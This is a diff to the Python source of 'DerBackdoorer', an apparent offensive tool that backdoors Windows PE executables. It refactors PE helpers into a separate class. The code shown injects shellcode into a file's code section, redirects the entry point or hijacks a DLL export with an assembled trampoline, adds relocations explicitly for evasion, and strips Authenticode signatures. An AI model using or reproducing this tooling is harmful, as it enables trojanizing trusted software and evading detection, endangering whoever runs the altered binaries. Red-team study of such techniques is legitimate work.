@@ -26,23 +26,12 @@ from enum import IntEnum
 import logging
 
 from helper import hexdump
-
+from derbackdoorer.mype import MyPe
 
 logger = logging.getLogger("DerBackdoorer")
 
 
 class PeBackdoor:
-    IMAGE_DIRECTORY_ENTRY_SECURITY = 4
-    IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
-    IMAGE_DIRECTORY_ENTRY_TLS = 9
-
-    IMAGE_REL_BASED_ABSOLUTE              = 0
-    IMAGE_REL_BASED_HIGH                  = 1
-    IMAGE_REL_BASED_LOW                   = 2
-    IMAGE_REL_BASED_HIGHLOW               = 3
-    IMAGE_REL_BASED_HIGHADJ               = 4
-    IMAGE_REL_BASED_DIR64                 = 10
-
     class SupportedSaveModes(IntEnum):
         WithinCodeSection   = 1
         NewPESection        = 2
@@ -64,30 +53,11 @@ class PeBackdoor:
     }
 
     def __init__(self):
-        self.pe = None
+        self.mype = None
         self.shellcodeOffset = 0     # from start of the file
         self.shellcodeOffsetRel = 0  # from start of the code section
         self.backdoorOffsetRel = 0   # from start of the code section
-        self.createdTlsSection = False  # TODO remove?
 
-
-    def openFile(self):
-        self.pe = pefile.PE(self.infile, fast_load=False)
-        self.pe.parse_data_directories()
-
-        self.ptrSize = 4
-        self.arch = self.getFileArch()
-        if self.arch == 'x64': 
-            self.ptrSize = 8
-
-    def getFileArch(self):
-        if self.pe.FILE_HEADER.Machine == 0x014c:
-            return "x86"
-
-        if self.pe.FILE_HEADER.Machine == 0x8664:
-            return "x64"
-
-        raise Exception("Unsupported PE file architecture.")
 
     def backdoor(self, saveMode, runMode, shellcode, infile, outfile):
         self.saveMode = saveMode
@@ -112,8 +82,8 @@ class PeBackdoor:
 
             #if len(self.options['ioc']) > 0:
             #    self.shellcodeData += b'\x00\x00\x00\x00' + self.options['ioc'].encode() + b'\x00\x00\x00\x00'
-
-            self.openFile()
+            self.mype = MyPe()
+            self.mype.openFile(self.infile)
 
             if not self.injectShellcode():
                 logger.error('Could not inject shellcode into PE file!')
@@ -123,7 +93,7 @@ class PeBackdoor:
                 logger.error('Could not setup shellcode launch within PE file!')
                 return False
 
-            remainingRelocsSize = self.getRemainingRelocsDirectorySize()
+            remainingRelocsSize = self.mype.getRemainingRelocsDirectorySize()
             numOfRelocs = int((remainingRelocsSize - 8) / 2)
             logger.debug(f'Still can add up to {numOfRelocs} relocs tampering with shellcode for evasion purposes.')
 
@@ -131,7 +101,7 @@ class PeBackdoor:
             #    self.removeSignature()
 
             logger.debug('Saving modified PE file...')
-            self.pe.write(self.outfile)
+            self.mype.write(self.outfile)
 
             return True
 
@@ -143,38 +113,28 @@ class PeBackdoor:
             raise
 
         finally:
-            self.pe.close()
+            self.mype.pe.close()
 
     def removeSignature(self):
-        addr = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress
-        size = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size
+        addr = self.mype.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress
+        size = self.mype.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size
 
-        self.pe.set_bytes_at_rva(addr, b'\x00' * size)
+        self.mype.pe.set_bytes_at_rva(addr, b'\x00' * size)
 
-        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0
-        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size = 0
+        self.mype.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0
+        self.mype.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size = 0
 
         logger.info('PE executable Authenticode signature removed.')
         return True
     
-
-    def _get_code_section(self):
-        entrypoint = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
-        for sect in self.pe.sections:
-            if sect.Characteristics & pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']:
-                if entrypoint >= sect.VirtualAddress and entrypoint <= sect.VirtualAddress + sect.Misc_VirtualSize:
-                    return sect
-        return None
-    
     def injectShellcode(self):
         if self.saveMode == int(PeBackdoor.SupportedSaveModes.WithinCodeSection):
-            entrypoint = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
-            sect = self._get_code_section()
+            sect = self.mype.get_code_section()
+            if sect == None:
+                logger.error('Could not find code section in input PE file!')
+                return False
             sect_name = sect.Name.decode().rstrip('\x00')
             sect_size = sect.Misc_VirtualSize  # Better than: SizeOfRawData
-            if sect == None:
-                return False
-            
             logger.debug(f'Backdooring {sect_name} section.')
 
             if sect_size < len(self.shellcodeData):
@@ -186,22 +146,22 @@ Code section size : {sect_size}
             offset = int((sect_size - len(self.shellcodeData)) / 2)
             logger.debug(f'Inserting shellcode into 0x{offset:x} offset.')
 
-            self.pe.set_bytes_at_offset(offset, self.shellcodeData)
+            self.mype.pe.set_bytes_at_offset(offset, self.shellcodeData)
             self.shellcodeOffset = offset
             self.shellcodeOffsetRel = offset - sect.PointerToRawData
     
-            rva = self.pe.get_rva_from_offset(offset)
+            rva = self.mype.pe.get_rva_from_offset(offset)
 
             p = sect.PointerToRawData + sect.SizeOfRawData - 64
             graph = textwrap.indent(f'''
 Beginning of {sect_name}:
-{textwrap.indent(hexdump(self.pe.get_data(sect.VirtualAddress), sect.VirtualAddress, 64), "0")}
+{textwrap.indent(hexdump(self.mype.pe.get_data(sect.VirtualAddress), sect.VirtualAddress, 64), "0")}
 
 Injected shellcode in the middle of {sect_name}:
 {hexdump(self.shellcodeData, offset, 64)}
 
 Trailing {sect_name} bytes:
-{hexdump(self.pe.get_data(self.pe.get_rva_from_offset(p)), p, 64)}
+{hexdump(self.mype.pe.get_data(self.mype.pe.get_rva_from_offset(p)), p, 64)}
 ''', '\t')
 
             logger.info(f'Shellcode injected into existing code section at RVA 0x{rva:x}')
@@ -211,8 +171,8 @@ Trailing {sect_name} bytes:
 
     def setupShellcodeEntryPoint(self):
         if self.runMode == int(PeBackdoor.SupportedRunModes.ModifyOEP):
-            rva = self.pe.get_rva_from_offset(self.shellcodeOffset)
-            self.pe.OPTIONAL_HEADER.AddressOfEntryPoint = rva
+            rva = self.mype.pe.get_rva_from_offset(self.shellcodeOffset)
+            self.mype.set_entrypoint(rva)
 
             logger.info(f'Address Of Entry Point changed to: RVA 0x{rva:x}')
             return True
@@ -238,27 +198,27 @@ Trailing {sect_name} bytes:
             logger.critical('Export name not specified! Specify DLL Exported function name to hijack with -e/--export')
 
         d = [pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
-        self.pe.parse_data_directories(directories=d)
+        self.mype.pe.parse_data_directories(directories=d)
 
-        if self.pe.DIRECTORY_ENTRY_EXPORT.symbols == 0:
+        if self.mype.pe.DIRECTORY_ENTRY_EXPORT.symbols == 0:
             logger.error('No DLL exports found! Specify existing DLL Exported function with -e/--export!')
             return -1
         
-        exports = [(e.ordinal, dec(e.name)) for e in self.pe.DIRECTORY_ENTRY_EXPORT.symbols]
+        exports = [(e.ordinal, dec(e.name)) for e in self.mype.pe.DIRECTORY_ENTRY_EXPORT.symbols]
 
         for export in exports:
             logger.debug(f'DLL Export: {export[0]} {export[1]}')
             if export[1].lower() == exportName.lower():
 
-                addr = self.pe.DIRECTORY_ENTRY_EXPORT.symbols[export[0]].address
+                addr = self.mype.pe.DIRECTORY_ENTRY_EXPORT.symbols[export[0]].address
                 logger.info(f'Found DLL Export "{exportName}" at RVA 0x{addr:x} . Attempting to hijack it...')
                 return addr
 
         return -1
 
     def backdoorEntryPoint(self, addr = -1):
-        imageBase = self.pe.OPTIONAL_HEADER.ImageBase
-        self.shellcodeAddr = self.pe.get_rva_from_offset(self.shellcodeOffset) + imageBase
+        imageBase = self.mype.pe.OPTIONAL_HEADER.ImageBase
+        self.shellcodeAddr = self.mype.pe.get_rva_from_offset(self.shellcodeOffset) + imageBase
 
         cs = None
         ks = None
@@ -275,16 +235,16 @@ Trailing {sect_name} bytes:
         ep = addr
 
         if addr == -1:
-            ep = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
+            ep = self.mype.pe.OPTIONAL_HEADER.AddressOfEntryPoint
 
-        ep_ava = ep + self.pe.OPTIONAL_HEADER.ImageBase
-        data = self.pe.get_memory_mapped_image()[ep:ep+128]
+        ep_ava = ep + self.mype.pe.OPTIONAL_HEADER.ImageBase
+        data = self.mype.pe.get_memory_mapped_image()[ep:ep+128]
         offset = 0
 
         logger.debug('Entry Point disasm:')
 
-        disasmData = self.pe.get_memory_mapped_image()
-        output = self.disasmBytes(cs, ks, disasmData, ep, 128, self.backdoorInstruction)
+        disasmData = self.mype.pe.get_memory_mapped_image()
+        output = self.mype.disasmBytes(cs, ks, disasmData, ep, 128, self.backdoorInstruction)
 
         # store offset... by calculating it first FUCK
         section = self._get_code_section()
@@ -293,15 +253,15 @@ Trailing {sect_name} bytes:
         if output != 0:
             logger.debug('Now disasm looks like follows: ')
 
-            disasmData = self.pe.get_memory_mapped_image()
-            self.disasmBytes(cs, ks, disasmData, output - 32, 32, None, maxDepth = 3)
+            disasmData = self.mype.pe.get_memory_mapped_image()
+            self.mype.disasmBytes(cs, ks, disasmData, output - 32, 32, None, maxDepth = 3)
 
             logger.debug('\n[>] Inserted backdoor code: ')
             for instr in cs.disasm(bytes(self.compiledTrampoline), output):
-                self._printInstr(instr, 1)
+                self.mype.printInstr(instr, 1)
 
             logger.debug('')
-            self.disasmBytes(cs, ks, disasmData, output + len(self.compiledTrampoline), 32, None, maxDepth = 3)
+            self.mype.disasmBytes(cs, ks, disasmData, output + len(self.compiledTrampoline), 32, None, maxDepth = 3)
 
         else:
             logger.error('Did not find suitable candidate for Entry Point branch hijack!')
@@ -366,14 +326,14 @@ Trailing {sect_name} bytes:
 
         if len(trampoline) > 0:
             encoding, count = ks.asm(trampoline)
-            self.pe.set_bytes_at_rva(instr.address, bytes(encoding))
+            self.mype.pe.set_bytes_at_rva(instr.address, bytes(encoding))
 
             relocs = (
                 instr.address + addrOffset,
             )
 
             pageRva = 4096 * int((instr.address + addrOffset) / 4096)
-            self.addImageBaseRelocations(pageRva, relocs)
+            self.mype.addImageBaseRelocations(pageRva, relocs)
 
             self.trampoline = trampoline
             self.compiledTrampoline = encoding
@@ -383,136 +343,6 @@ Trailing {sect_name} bytes:
             return instr.address
 
         return 0
-
-    def disasmBytes(self, cs, ks, disasmData, startOffset, length, callback = None, maxDepth = 5):
-        return self._disasmBytes(cs, ks, disasmData, startOffset, length, callback, maxDepth, 1)
-
-    def _printInstr(self, instr, depth):
-        _bytes = [f'{x:02x}' for x in instr.bytes[:8]]
-        if len(instr.bytes) < 8:
-            _bytes.extend(['  ',] * (8 - len(instr.bytes)))
-
-        instrBytes = ' '.join([f'{x}' for x in _bytes])
-        logger.debug('\t' * 1 + f'[{instr.address:08x}]\t{instrBytes}' + '\t' * depth + f'{instr.mnemonic}\t{instr.op_str}')
-
-
-    def _disasmBytes(self, cs, ks, disasmData, startOffset, length, callback, maxDepth, depth):
-        if depth > maxDepth:
-            return 0
-
-        data = disasmData[startOffset:startOffset + length]
-
-        for instr in cs.disasm(data, startOffset):
-            self._printInstr(instr, depth)
-
-            if len(instr.operands) == 1:
-                operand = instr.operands[0]
-
-                if operand.type == capstone.CS_OP_IMM:
-                    logger.debug('\t' * (depth+1) + f' -> OP_IMM: 0x{operand.value.imm:x}')
-                    logger.debug('')
-
-                    if callback:
-                        out = callback(cs, ks, disasmData, startOffset, instr, operand, depth)
-                        if out != 0:
-                            return out
-
-                    if depth + 1 <= maxDepth:
-                        out = self._disasmBytes(cs, ks, disasmData, operand.value.imm, length, callback, maxDepth, depth + 1)
-                        return out
-
-        if not callback:
-            return 1
-
-        return 0
-
-    def addImageBaseRelocations(self, pageRva, relocs):
-        relocType = PeBackdoor.IMAGE_REL_BASED_HIGHLOW
-
-        if self.arch == 'x64': 
-            relocType = PeBackdoor.IMAGE_REL_BASED_DIR64
-
-        if not self.pe.has_relocs():
-            logger.error("No .reloc section")
-            raise(Exception("No .reloc section"))
-        else:
-            self.addRelocs(pageRva, relocs)
-
-    def getSectionIndexByName(self, name):
-        i = 0
-        for sect in self.pe.sections:
-            if sect.Name.decode().lower().startswith(name.lower()):
-                return i
-            i += 1
-
-        logger.error(f'Could not find section with name {name}!')
-        return -1
-
-    def getSectionIndexByDataDir(self, dirIndex):
-        addr = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[dirIndex].VirtualAddress
-
-        i = 0
-        for sect in self.pe.sections:
-            if addr >= sect.VirtualAddress and addr < (sect.VirtualAddress + sect.Misc_VirtualSize):
-                return i
-            i += 1
-
-        logger.error(f'Could not find section with directory index {dirIndex}!')
-        return -1
-
-    def getRemainingRelocsDirectorySize(self):
-        if self.createdTlsSection:
-            return 0x1000
-
-        relocsIndex = self.getSectionIndexByDataDir(PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC)
-
-        out = self.pe.sections[relocsIndex].SizeOfRawData - self.pe.sections[relocsIndex].Misc_VirtualSize
-        return out
-
-
-    def addRelocs(self, pageRva, relocs):
-        assert pageRva > 0
-
-        imageBaseRelocType = PeBackdoor.IMAGE_REL_BASED_HIGHLOW
-
-        if self.arch == 'x64':
-            imageBaseRelocType = PeBackdoor.IMAGE_REL_BASED_DIR64
-
-        logger.info('Adding new relocations to backdoored PE file...')
-
-        relocsSize = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size
-        relocsIndex = self.getSectionIndexByDataDir(PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC)
-        addr = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
-        sizeOfReloc = 2 * len(relocs) + 2 * 4
-
-        if sizeOfReloc >= self.getRemainingRelocsDirectorySize():
-            self.logger.warn('WARNING! Cannot add any more relocations to this file. Probably TLS Callback execution technique wont work.')
-            self.logger.warn('         Will try disabling relocations on output file. Expect corrupted executable though!')
-
-            self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0
-            self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0
-            return
-
-        relocDirRva = self.pe.sections[relocsIndex].VirtualAddress
-        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size += sizeOfReloc
-
-        # VirtualAddress
-        self.pe.set_dword_at_rva(addr + relocsSize, pageRva)
-
-        # SizeOfBlock
-        self.pe.set_dword_at_rva(addr + relocsSize + 4, sizeOfReloc)
-
-        logger.debug(f'Adding {len(relocs)} relocations for Page RVA 0x{pageRva:x} - size of block: 0x{sizeOfReloc:x}')
-
-        i = 0
-        for reloc in relocs:
-            reloc_offset = (reloc - pageRva)
-            reloc_type = imageBaseRelocType << 12
-
-            relocWord = (reloc_type | reloc_offset)
-            self.pe.set_word_at_rva(relocDirRva + relocsSize + 8 + i * 2, relocWord)
-            logger.debug(f'\tReloc{i} for addr 0x{reloc:x}: 0x{relocWord:x} - 0x{reloc_offset:x} - type: {imageBaseRelocType}')
-            i += 1
 
 
 def opts(argv):
